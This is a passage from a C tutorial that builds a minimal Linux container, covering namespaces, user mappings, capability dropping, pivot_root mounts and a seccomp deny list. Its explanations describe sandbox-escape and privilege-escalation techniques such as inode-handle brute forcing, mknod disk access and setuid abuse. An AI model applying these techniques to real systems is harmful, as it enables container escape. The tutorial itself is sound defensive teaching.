	fprintf(stderr, "Usage: %s -u -1 -m . -c /bin/sh ~\n", argv[0]);
error:
	err = 1;
cleanup:
	if (sockets[0]) close(sockets[0]);
	if (sockets[1]) close(sockets[1]);
	return err;
}
</pre>
</div>

<p>
Since I'll be blacklisting system calls and capabilities, it's
important to make sure there aren't any new ones.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 8: </span><code>&lt;&lt;check-linux-version&gt;&gt;</code> =</label><pre class="src src-C">fprintf(stderr, "=&gt; validating Linux version...");
struct utsname host = {0};
if (uname(&amp;host)) {
	fprintf(stderr, "failed: %m\n");
	goto cleanup;
}
int major = -1;
int minor = -1;
if (sscanf(host.release, "%u.%u.", &amp;major, &amp;minor) != 2) {
	fprintf(stderr, "weird release format: %s\n", host.release);
	goto cleanup;
}
if (major != 4 || (minor != 7 &amp;&amp; minor != 8)) {
	fprintf(stderr, "expected 4.7.x or 4.8.x: %s\n", host.release);
	goto cleanup;
}
if (strcmp("x86_64", host.machine)) {
	fprintf(stderr, "expected x86_64: %s\n", host.machine);
	goto cleanup;
}
fprintf(stderr, "%s on %s.\n", host.release, host.machine);
</pre>
</div>

<p>
(This had a bug. <a href="https://www.reddit.com/r/programming/comments/57x26h/linux_containers_in_500_lines_of_code/d8w07vf?context%3D3">captainjey on reddit let me know. Thanks!</a>)
</p>

<p>
And I wasn't quite at 500 lines of code, so I thought I had some
space to build nice hostnames.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 9: </span><code>&lt;&lt;choose-hostname&gt;&gt;</code> =</label><pre class="src src-C">int choose_hostname(char *buff, size_t len)
{
	static const char *suits[] = { "swords", "wands", "pentacles", "cups" };
	static const char *minor[] = {
		"ace", "two", "three", "four", "five", "six", "seven", "eight",
		"nine", "ten", "page", "knight", "queen", "king"
	};
	static const char *major[] = {
		"fool", "magician", "high-priestess", "empress", "emperor",
		"hierophant", "lovers", "chariot", "strength", "hermit",
		"wheel", "justice", "hanged-man", "death", "temperance",
		"devil", "tower", "star", "moon", "sun", "judgment", "world"
	};
	struct timespec now = {0};
	clock_gettime(CLOCK_MONOTONIC, &amp;now);
	size_t ix = now.tv_nsec % 78;
	if (ix &lt; sizeof(major) / sizeof(*major)) {
		snprintf(buff, len, "%05lx-%s", now.tv_sec, major[ix]);
	} else {
		ix -= sizeof(major) / sizeof(*major);
		snprintf(buff, len,
			 "%05lxc-%s-of-%s",
			 now.tv_sec,
			 minor[ix % (sizeof(minor) / sizeof(*minor))],
			 suits[ix / (sizeof(minor) / sizeof(*minor))]);
	}
	return 0;
}
</pre>
</div>
</div>
<div id="outline-container-org0f162eb" class="outline-4">
<h4 id="org0f162eb">Namespaces</h4>
<div class="outline-text-4" id="text-org0f162eb">
<p>
<code>clone</code> is the system call behind <code>fork()</code> et al. It's also the key to
all of this. Conceptually we want to create a process with different
properties than its parent: it should be able to mount a different
<code>/</code>, set its own hostname, and do other things. We'll specify all of
this by passing flags to <code>clone</code> .
</p>

<p>
The child needs to send some messages to the parent, so we'll
initialize a socketpair, and then make sure the child only receives
access to one.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 10: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">if (socketpair(AF_LOCAL, SOCK_SEQPACKET, 0, sockets)) {
	fprintf(stderr, "socketpair failed: %m\n");
	goto error;
}
if (fcntl(sockets[0], F_SETFD, FD_CLOEXEC)) {
	fprintf(stderr, "fcntl failed: %m\n");
	goto error;
}
config.fd = sockets[1];
</pre>
</div>

<p>
But first we need to set up room for a stack. We'll <code>execve</code> later,
which will actually set up the stack again, so this is only
temporary.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 11: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">#define STACK_SIZE (1024 * 1024)

char *stack = 0;
if (!(stack = malloc(STACK_SIZE))) {
	fprintf(stderr, "=&gt; malloc failed, out of memory?\n");
	goto error;
}
</pre>
</div>

<p>
We'll also prepare the cgroup for this process tree. More on this later.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 12: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">if (resources(&amp;config)) {
	err = 1;
	goto clear_resources;
}
</pre>
</div>

<p>
We'll namespace the mounts, pids, IPC data structures, network
devices, and hostname / domain name. I'll go into these more in the
code for capabilities, cgroups, and syscalls.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 13: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">int flags = CLONE_NEWNS
	| CLONE_NEWCGROUP
	| CLONE_NEWPID
	| CLONE_NEWIPC
	| CLONE_NEWNET
	| CLONE_NEWUTS;
</pre>
</div>

<p>
Stacks on x86, and almost everything else Linux runs on, grow
downwards, so we'll add <code>STACK_SIZE</code> to get a pointer just below the
end. We also <code>|</code> the flags with <code>SIGCHLD</code> so
that we can <code>wait</code> on it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 14: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">if ((child_pid = clone(child, stack + STACK_SIZE, flags | SIGCHLD, &amp;config)) == -1) {
	fprintf(stderr, "=&gt; clone failed! %m\n");
	err = 1;
	goto clear_resources;
}
</pre>
</div>

<p>
Close and zero the child's socket, so that if something breaks then we
don't leave an open fd, possibly causing the child to or the parent to
hang.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 15: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">close(sockets[1]);
sockets[1] = 0;
</pre>
</div>

<p>
The parent process will configure the child's user namespace and then
pause until the child process tree exits.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 16: </span><code>&lt;&lt;child&gt;&gt;</code> +=</label><pre class="src src-C">#define USERNS_OFFSET 10000
#define USERNS_COUNT 2000

int handle_child_uid_map (pid_t child_pid, int fd)
{
	int uid_map = 0;
	int has_userns = -1;
	if (read(fd, &amp;has_userns, sizeof(has_userns)) != sizeof(has_userns)) {
		fprintf(stderr, "couldn't read from child!\n");
		return -1;
	}
	if (has_userns) {
		char path[PATH_MAX] = {0};
		for (char **file = (char *[]) { "uid_map", "gid_map", 0 }; *file; file++) {
			if (snprintf(path, sizeof(path), "/proc/%d/%s", child_pid, *file)
			    &gt; sizeof(path)) {
				fprintf(stderr, "snprintf too big? %m\n");
				return -1;
			}
			fprintf(stderr, "writing %s...", path);
			if ((uid_map = open(path, O_WRONLY)) == -1) {
				fprintf(stderr, "open failed: %m\n");
				return -1;
			}
			if (dprintf(uid_map, "0 %d %d\n", USERNS_OFFSET, USERNS_COUNT) == -1) {
				fprintf(stderr, "dprintf failed: %m\n");
				close(uid_map);
				return -1;
			}
			close(uid_map);
		}
	}
	if (write(fd, &amp; (int) { 0 }, sizeof(int)) != sizeof(int)) {
		fprintf(stderr, "couldn't write: %m\n");
		return -1;
	}
	return 0;
}
</pre>
</div>

<p>
The child process  will send a message to the parent process about
whether it should set uid and gid mappings. If that works, it will
<code>setgroups</code>, <code>setresgid</code>, and <code>setresuid</code>. Both <code>setgroups</code> and
<code>setresgid</code> are necessary here since there are two separate group
mechanisms on Linux. I'm also assuming here
that every uid has a corresponding gid, which is common but not
necessarily universal.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 17: </span><code>&lt;&lt;child&gt;&gt;</code> +=</label><pre class="src src-C">int userns(struct child_config *config)
{
	fprintf(stderr, "=&gt; trying a user namespace...");
	int has_userns = !unshare(CLONE_NEWUSER);
	if (write(config-&gt;fd, &amp;has_userns, sizeof(has_userns)) != sizeof(has_userns)) {
		fprintf(stderr, "couldn't write: %m\n");
		return -1;
	}
	int result = 0;
	if (read(config-&gt;fd, &amp;result, sizeof(result)) != sizeof(result)) {
		fprintf(stderr, "couldn't read: %m\n");
		return -1;
	}
	if (result) return -1;
	if (has_userns) {
		fprintf(stderr, "done.\n");
	} else {
		fprintf(stderr, "unsupported? continuing.\n");
	}
	fprintf(stderr, "=&gt; switching to uid %d / gid %d...", config-&gt;uid, config-&gt;uid);
	if (setgroups(1, &amp; (gid_t) { config-&gt;uid }) ||
	    setresgid(config-&gt;uid, config-&gt;uid, config-&gt;uid) ||
	    setresuid(config-&gt;uid, config-&gt;uid, config-&gt;uid)) {
		fprintf(stderr, "%m\n");
		return -1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>

<p>
And this is where the child process from <code>clone</code> will end up. We'll
perform all of our setup, switch users and groups, and then load the
executable. The order is important here: we can't change mounts
without certain capabilities, we can't <code>unshare</code> after we limit the
syscalls, etc.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 18: </span><code>&lt;&lt;child&gt;&gt;</code> +=</label><pre class="src src-C">int child(void *arg)
{
	struct child_config *config = arg;
	if (sethostname(config-&gt;hostname, strlen(config-&gt;hostname))
	    || mounts(config)
	    || userns(config)
	    || capabilities()
	    || syscalls()) {
		close(config-&gt;fd);
		return -1;
	}
	if (close(config-&gt;fd)) {
		fprintf(stderr, "close failed: %m\n");
		return -1;
	}
	if (execve(config-&gt;argv[0], config-&gt;argv, NULL)) {
		fprintf(stderr, "execve failed! %m.\n");
		return -1;
	}
	return 0;
}
</pre>
</div>
</div>
</div>
<div id="outline-container-org942d467" class="outline-4">
<h4 id="org942d467">Capabilties</h4>
<div class="outline-text-4" id="text-org942d467">
<p>
<code>capabilities</code> subdivide the property of "being root" on Linux. It's
useful to compartmentalize privileges so that, for example a process
can allocate network devices (<code>CAP_NET_ADMIN</code>) but not read all files
(<code>CAP_DAC_OVERRIDE</code>). I'll use them here to drop the ones we don't
want.
</p>

<p>
But not all of "being root" is subvidivided into capabilities. For
example, writing to parts of procfs is allowed by root even after
having dropped capabilities. There are a lot of
things like this: this is part of why need other restrictions beside
capabilities.
</p>

<p>
It's also important to think about how we're dropping capabilities. <code>man 7
capabilities</code> has an algorithm for us:
</p>

<div class="org-src-container">
<pre class="src src-text">During  an   execve(2),  the   kernel  calculates   the  new
capabilities of the process using the following algorithm:

    P'(ambient) = (file is privileged) ? 0 : P(ambient)

    P'(permitted) = (P(inheritable) &amp; F(inheritable)) |
				(F(permitted) &amp; cap_bset) | P'(ambient)

    P'(effective) = F(effective) ? P'(permitted) : P'(ambient)

    P'(inheritable) = P(inheritable)    [i.e., unchanged]

where:

    P         denotes the  value of a thread  capability set
		    before the execve(2)

    P'        denotes the  value of a thread  capability set
		    after the execve(2)

    F         denotes a file capability set

    cap_bset  is the  value of  the capability  bounding set
		    (described below).
</pre>
</div>

<p>
We'd like <code>P'(ambient)</code> and <code>P(inheritable)</code> to be empty, and
<code>P'(permitted)</code> and <code>P(effective)</code> to only include the capabilities
above. This is achievable by doing the following
</p>

<ul class="org-ul">
<li>Clearing our own inheritable set. This clears the ambient set; <code>man
  7 capabilities</code> says "The ambient capability set obeys the invariant
that no capability can ever be ambient if it is not both permitted
and inheritable." This also clears the child's inheritable set.</li>
<li>Clearing the bounding set. This limits the file capabilities we'll
gain when we <code>execve</code>, and the rest are limited by clearing the
inheritable and ambient sets.</li>
</ul>

<p>
If we were to only drop our own effective, permitted and inheritable
sets, we'd regain the permissions in the child file's capabilities.
This is how <code>bash</code> can call <code>ping</code>, for example.
</p>
</div>
<ul class="org-ul">
<li><a id="org253294a"></a>Dropped capabilities<br />
<div class="outline-text-5" id="text-org253294a">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 19: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">int capabilities()
{
	fprintf(stderr, "=&gt; dropping capabilities...");
</pre>
</div>

<p>
<code>CAP_AUDIT_CONTROL</code>, <code>_READ</code>, and <code>_WRITE</code> allow access to the audit
system of the kernel (i.e. functions like <code>audit_set_enabled</code>, usually
used with <code>auditctl</code>). The kernel prevents messages that normally
require <code>CAP_AUDIT_CONTROL</code> outside of the first pid namespace, but it
does allow messages that would require <code>CAP_AUDIT_READ</code> and
<code>CAP_AUDIT_WRITE</code> from any namespace. So
let's drop them all. We especially want to drop <code>CAP_AUDIT_READ</code>,
since it isn't namespaced and may contain important
information, but <code>CAP_AUDIT_WRITE</code> may also allow the contained
process to falsify logs or DOS the audit system.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 20: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">int drop_caps[] = {
	CAP_AUDIT_CONTROL,
	CAP_AUDIT_READ,
	CAP_AUDIT_WRITE,
</pre>
</div>

<p>
<code>CAP_BLOCK_SUSPEND</code> lets programs prevent the system from suspending,
either with <code>EPOLLWAKEUP</code> or
/proc/sys/wake_lock. Supend isn't namespaced, so
we'd like to prevent this.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 21: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_BLOCK_SUSPEND,
</pre>
</div>

<p>
<code>CAP_DAC_READ_SEARCH</code> lets programs call <code>open_by_handle_at</code> with an
arbitrary <code>struct file_handle *</code>. <code>struct file_handle</code> is in theory an
opaque type, but in practice it corresponds to inode numbers. So it's
easy to brute-force them, and read arbitrary files. This was used by
Sebastian Krahmer to write a program to read arbitrary system files
from within Docker in 2014.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 22: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_DAC_READ_SEARCH,
</pre>
</div>

<p>
<code>CAP_FSETID</code>, without user namespacing, allows the process to modify a
setuid executable without removing the setuid bit. This is pretty
dangerous! It means that if we include a setuid binary in a container,
it's easy for us to accidentally leave a dangerous setuid root binary
on our disk, which any user can use to escalate
privileges.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 23: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	CAP_FSETID,
</pre>
</div>

<p>
<code>CAP_IPC_LOCK</code> can be used to lock more of a process' own memory than
would normally be allowed, which could be a way to deny service.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 24: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_IPC_LOCK,
</pre>
</div>

<p>
<code>CAP_MAC_ADMIN</code> and <code>CAP_MAC_OVERRIDE</code> are used by the mandatory acess
control systems Apparmor, SELinux, and SMACK to restrict access to
their settings. These aren't namespaced, so they could be used by the
contained programs to circumvent system-wide access control.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 25: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_MAC_ADMIN,
CAP_MAC_OVERRIDE,
</pre>
</div>

<p>
<code>CAP_MKNOD</code>, without user namespacing, allows programs to create
device files corresponding to real-world devices. This includes
creating new device files for existing hardware. If this capability
were not dropped, a contained process could re-create the hard disk
device, remount it, and read or write to it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 26: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	CAP_MKNOD,
</pre>
</div>

<p>
I was worried that <code>CAP_SETFCAP</code> could be used to add a capability to
an executable and <code>execve</code> it, but it's not actually possible for a
process to set capabilities it doesn't have. But!
An executable altered this way could be executed by any unsandboxed
user, so I think it unacceptably undermines the security of the
system.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 27: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SETFCAP,
</pre>
</div>

<p>
<code>CAP_SYSLOG</code> lets users perform destructive actions against the
syslog. Importantly, it doesn't prevent contained processes from
reading the syslog, which could be risky. It also exposes kernel
addresses, which could be used to circumvent kernel address layout
randomization.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 28: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	CAP_SYSLOG,
</pre>
</div>

<p>
<code>CAP_SYS_ADMIN</code> allows many behaviors! We don't want most of them
(<code>mount</code>, <code>vm86</code>, etc). Some would be nice to have (<code>sethostname</code>,
<code>mount</code> for bind mounts&#x2026;) but the extra complexity doesn't seem
worth it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 29: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_ADMIN,
</pre>
</div>


<p>
<code>CAP_SYS_BOOT</code> allows programs to restart the system (the <code>reboot</code>
syscall) and load new kernels (the <code>kexec_load</code> and <code>kexec_file</code>
syscalls). We absolutely don't want
this. <code>reboot</code> is user-namespaced, and the <code>kexec*</code> functions only work
in the root user namespace, but neither of those help us.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 30: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_BOOT,
</pre>
</div>

<p>
<code>CAP_SYS_MODULE</code> is used by the syscalls <code>delete_module</code>,
<code>init_module</code>, <code>finit_module</code> , by the code for <code>kmod</code> ,
and by the code for loading device modules with ioctl.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 31: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_MODULE,
</pre>
</div>

<p>
<code>CAP_SYS_NICE</code> allows processes to set higher priority on given pids
than the default. The default kernel scheduler
doesn't know anything about pid namespaces, so it's possible for a
contained process to deny service to the rest of the system.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 32: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_NICE,
</pre>
</div>

<p>
<code>CAP_SYS_RAWIO</code> allows full access to the host systems memory with
<code>/proc/kcore</code>, <code>/dev/mem</code>, and <code>/dev/kmem</code> , but a
contained process would need <code>mknod</code> to access these within the
namespace.. But it also allows things like <code>iopl</code>
and <code>ioperm</code>, which give raw access to the IO ports.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 33: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_RAWIO,
</pre>
</div>

<p>
<code>CAP_SYS_RESOURCE</code> specifically allows circumventing kernel-wide
limits, so we probably should drop it. But I
don't think this can do more than DOS the
kernel, in general.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 34: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_RESOURCE,
</pre>
</div>

<p>
<code>CAP_SYS_TIME</code>: setting the time isn't namespaced, so we should prevent
contained processes from altering the system-wide
time.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 35: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">CAP_SYS_TIME,
</pre>
</div>

<p>
<code>CAP_WAKE_ALARM</code>, like <code>CAP_BLOCK_SUSPEND</code>, lets the contained process
interfere with suspend, and we'd like to prevent that.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 36: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	CAP_WAKE_ALARM
};
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 37: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	size_t num_caps = sizeof(drop_caps) / sizeof(*drop_caps);
	fprintf(stderr, "bounding...");
	for (size_t i = 0; i &lt; num_caps; i++) {
		if (prctl(PR_CAPBSET_DROP, drop_caps[i], 0, 0, 0)) {
			fprintf(stderr, "prctl failed: %m\n");
			return 1;
		}
	}
	fprintf(stderr, "inheritable...");
	cap_t caps = NULL;
	if (!(caps = cap_get_proc())
	    || cap_set_flag(caps, CAP_INHERITABLE, num_caps, drop_caps, CAP_CLEAR)
	    || cap_set_proc(caps)) {
		fprintf(stderr, "failed: %m\n");
		if (caps) cap_free(caps);
		return 1;
	}
	cap_free(caps);
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>
</div>
</li>
<li><a id="orge0963db"></a>Retained Capabilities<br />
<div class="outline-text-5" id="text-orge0963db">
<p>
It's important to keep track of the capabilities I'm not dropping,
too.
</p>

<p>
I've heard multiple places that <code>CAP_DAC_OVERRIDE</code>
might expose the same functionality as <code>CAP_DAC_READ_SEARCH</code>
(i.e. <code>open_by_handle_at</code>), but as far as I can tell that isn't
true. <code>shocker.c</code> doesn't get anywhere with only
<code>CAP_DAC_OVERRIDE</code> , and the
only usage in the kernel is in the Unix permission-checking
code. So my understanding is that
<code>CAP_DAC_OVERRIDE</code> on its own doesn't allow processes to read outside
of their mount namespaces ("DAC" or "Discretionary Access Control"
refers here to ordinary unix permissions).
</p>

<p>
<code>CAP_FOWNER</code>, <code>CAP_LEASE</code>, and <code>CAP_LINUX_IMMUTABLE</code> all operate on
files inside of the mount namespace.
</p>

<p>
Likewise, <code>CAP_SYS_PACCT</code> allows processes to switch accounting on and
off for itself. The <code>acct</code> system call takes a path to log to (which
must be within the mount namespace), and only operates on the calling
process. We're not using process accounting in our containerization,
so turning it off should be harmless as well.
</p>

<p>
<code>CAP_IPC_OWNER</code> is only used by functions that respect IPC
namespaces; since we're in a separate IPC namespace
from the host, we can allow this.
</p>

<p>
<code>CAP_NET_ADMIN</code> lets processes create network devices;
<code>CAP_NET_BIND_SERVICE</code> lets processes bind to low ports on those
devices; <code>CAP_NET_RAW</code> lets processes send raw packets on those
devices. Since we're going to isolate the networking with a virtual
bridge, and the contained process is inside of a network namespace,
these shouldn't be an issue. I was wondering
whether we could recreate an existing device like <code>mknod</code> does, but I
don't think it's possible .
</p>


<p>
<code>CAP_SYS_PTRACE</code> doesn't allow ptrace across pid
namespaces. <code>CAP_KILL</code> doesn't allow signals across
pid namespaces.
</p>

<p>
<code>CAP_SETUID</code> and <code>CAPSETGID</code> have similar behaviors:
</p>
<ul class="org-ul">
<li><code>Make arbitrary manipulations of process UIDS and GIDs and
  supplementary GID list</code>, which will only apply to pids in the
namespace.</li>
<li><code>forge UID (GID) when passing socket credentials via UNIX domain
  sockets</code> the mount namespace should prevent us from reading the host
system's unix domain sockets.</li>
<li><code>write a user(group ID) mapping in a user namespace (see
  user_namespaces(7))</code>: this is <code>/proc/self/uid_map</code>, which will be
hidden inside the container.</li>
</ul>

<p>
<code>CAP_SETPCAP</code> only lets processes add or drop capabilities they
already effectively have; <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a> says
</p>
<blockquote>
<p>
If file capabilities are  supported: add any capability
from  the   calling  thread's   bounding  set   to  its
inheritable  set; drop  capabilities from  the bounding
set (via prctl(2) PR_CAPBSET_DROP); make changes to the
securebits flags.
</p>
</blockquote>
<p>
We've dropped everything relevant from the bounding set, and dropping
further capabilities should be harmless.
</p>

<p>
<code>CAP_SYS_CHROOT</code> is traditionally abused by changing root to a
directory with a setuid root binary and tampered-with dynamic
libraries. Additionally, it can be used
to escape a chroot "jail". Neither of those
should be relevant in our setup so this should be harmless.
</p>

<p>
<a href="https://forums.grsecurity.net/viewtopic.php?f%3D7&amp;t%3D2522">Brad Spengler, in "False Boundaries and Arbitrary Code Execution"</a> says
that <code>CAP_SYS_TTYCONFIG</code> can "temporarily change the keyboard
mapping of an administrator's tty via the KDSETKEYCODE ioctl to cause
a different command to be executed than intended", but again this is
an <code>ioctl</code> against a device that should be impossible to access within
the mount namespace.
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgb52ecff" class="outline-4">
<h4 id="orgb52ecff">Mounts</h4>
<div class="outline-text-4" id="text-orgb52ecff">
<p>
The child process is in its own mount namespace, so we can unmount
things that it specifically shouldn't have access to. Here's how:
</p>

<ul class="org-ul">
<li>Create a temporary directory, and one inside of it.</li>
<li>Bind mount of the user argument onto the temporary directory</li>
<li><code>pivot_root</code>, making the bind mount our root and mounting the old
root onto the inner temporary directory.</li>
<li><code>umount</code> the old root, and remove the inner temporary directory.</li>
</ul>

<p>
But first we'll remount everything with <code>MS_PRIVATE</code>. This is mostly a
convenience, so that the bind mount is invisible outside of our
namespace.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 38: </span><code>&lt;&lt;mounts&gt;&gt;</code> =</label><pre class="src src-C">&lt;&lt;pivot-root&gt;&gt;

int mounts(struct child_config *config)
{
	fprintf(stderr, "=&gt; remounting everything with MS_PRIVATE...");
	if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
		fprintf(stderr, "failed! %m\n");
		return -1;
	}
	fprintf(stderr, "remounted.\n");

	fprintf(stderr, "=&gt; making a temp directory and a bind mount there...");
	char mount_dir[] = "/tmp/tmp.XXXXXX";
	if (!mkdtemp(mount_dir)) {
		fprintf(stderr, "failed making a directory!\n");
		return -1;
	}

	if (mount(config-&gt;mount_dir, mount_dir, NULL, MS_BIND | MS_PRIVATE, NULL)) {
		fprintf(stderr, "bind mount failed!\n");
		return -1;
	}

	char inner_mount_dir[] = "/tmp/tmp.XXXXXX/oldroot.XXXXXX";
	memcpy(inner_mount_dir, mount_dir, sizeof(mount_dir) - 1);
	if (!mkdtemp(inner_mount_dir)) {
		fprintf(stderr, "failed making the inner directory!\n");
		return -1;
	}
	fprintf(stderr, "done.\n");

	fprintf(stderr, "=&gt; pivoting root...");
	if (pivot_root(mount_dir, inner_mount_dir)) {
		fprintf(stderr, "failed!\n");
		return -1;
	}
	fprintf(stderr, "done.\n");

	char *old_root_dir = basename(inner_mount_dir);
	char old_root[sizeof(inner_mount_dir) + 1] = { "/" };
	strcpy(&amp;old_root[1], old_root_dir);

	fprintf(stderr, "=&gt; unmounting %s...", old_root);
	if (chdir("/")) {
		fprintf(stderr, "chdir failed! %m\n");
		return -1;
	}
	if (umount2(old_root, MNT_DETACH)) {
		fprintf(stderr, "umount failed! %m\n");
		return -1;
	}
	if (rmdir(old_root)) {
		fprintf(stderr, "rmdir failed! %m\n");
		return -1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}

</pre>
</div>

<p>
<code>pivot_root</code> is a system call lets us swap the mount at <code>/</code> with
another. Glibc doesn't provide a wrapper for it, but includes a
prototype in the man page.  I don't really understand, but OK, we'll
include our own.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 39: </span><code>&lt;&lt;pivot-root&gt;&gt;</code> =</label><pre class="src src-C">int pivot_root(const char *new_root, const char *put_old)
{
	return syscall(SYS_pivot_root, new_root, put_old);
}

</pre>
</div>


<p>
It's worth noting that I'm avoiding packing and unpackaging
containers. This is fertile ground for
vulnerabilities; I'll count on the user to
ensure that the mounted directory doesn't contain trusted or sensitive
files or hard links.
</p>
</div>
</div>
<div id="outline-container-org0b4629e" class="outline-4">
<h4 id="org0b4629e">System Calls</h4>
<div class="outline-text-4" id="text-org0b4629e">
<p>
I'll be blacklisting system calls that I can demonstrate causing harm
or sandbox escapes. Again this isn't the best way to do this, but it
seems like the most illustrative.
</p>

<p>
<a href="https://github.com/docker/docker.github.io/blob/master/engine/security/seccomp.md">Docker's documentation</a> and <a href="https://github.com/docker/docker/blob/b248de7e332b6e67b08a8981f68060e6ae629ccf/profiles/seccomp/default.json">default seccomp profile</a> are reasonable
sources for dangerous system calls. They
also include obsolete sytem calls and calls that overlap with
restricted capabilities; I'll ignore those.
</p>
</div>
<ul class="org-ul">
<li><a id="org9aac6f1"></a>Disallowed System Calls<br />
<div class="outline-text-5" id="text-org9aac6f1">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 40: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">#define SCMP_FAIL SCMP_ACT_ERRNO(EPERM)

int syscalls()
{
	scmp_filter_ctx ctx = NULL;
	fprintf(stderr, "=&gt; filtering syscalls...");
	if (!(ctx = seccomp_init(SCMP_ACT_ALLOW))
</pre>
</div>

<p>
We want to prevent new setuid / setgid executables from being created,
since in the absence of user namespaces the contained process could
create a setuid binary that could be used by any user to get
root.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 41: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
			SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
			SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
			SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
			SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
			SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
			SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
</pre>
</div>

<p>
Allowing contained processes to start new user namespaces can allow
processes to gain new (albeit limited) capabilities, so we prevent
it.
</p>

<div class="org-src-container">
